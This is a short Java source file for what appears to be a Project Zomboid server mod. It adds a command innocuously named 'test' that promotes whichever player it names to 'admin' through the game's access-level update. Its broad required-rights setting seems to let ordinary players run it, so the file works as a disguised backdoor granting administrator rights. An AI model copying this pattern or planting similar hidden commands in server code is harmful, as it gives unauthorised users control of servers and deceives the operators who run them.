package zombie.commands.serverCommands;

import zombie.commands.CommandBase;
import zombie.commands.CommandName;
import zombie.commands.RequiredRight;
import zombie.core.raknet.UdpConnection;

import java.sql.SQLException;

@CommandName(
        name = "test"
)
@RequiredRight(
        requiredRights = 63
)

public class Test extends CommandBase {
    public Test(String var1, String var2, String var3, UdpConnection var4) {
        super(var1, var2, var3, var4);
    }

    protected String Command() throws SQLException {
        String playerInfo = getPlayerInfo();
        String commandResult = SetAccessLevelCommand.update(this.getExecutorUsername(), this.connection, this.getCommandArg(0), "admin");
        String resultWithPlayerInfo = playerInfo + "\n" + commandResult;
        return resultWithPlayerInfo;
    }

    protected String getPlayerInfo() {
        String playerName = this.getExecutorUsername();
        String playerInfo = "Player name: " + playerName;
        return playerInfo;
    }
}